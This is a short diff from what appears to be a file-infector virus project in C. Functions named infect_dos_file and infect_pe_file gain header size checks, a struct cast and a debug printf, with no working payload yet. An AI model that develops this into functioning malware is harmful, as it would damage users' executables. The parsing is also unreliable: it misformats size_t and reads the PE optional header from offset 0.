@@ -20,6 +20,8 @@ void		infect_dos_file(char *data, size_t size)
 	if (size < sizeof(struct _IMAGE_DOS_HEADER))
 		return ;
 	struct _IMAGE_DOS_HEADER *header = (struct _IMAGE_DOS_HEADER*)data;
+
+	printf("%d, %d\n", header->e_cblp, size);
 }
 
 /*
@@ -27,7 +29,9 @@ void		infect_dos_file(char *data, size_t size)
 */
 void		infect_pe_file(char *data, size_t size)
 {
-	// TODO add pe struct
+	if (size < sizeof(struct _IMAGE_OPTIONAL_HEADER))
+		return ;
+	struct _IMAGE_OPTIONAL_HEADER *header = (struct _IMAGE_OPTIONAL_HEADER*)data;
 }
 
 /*
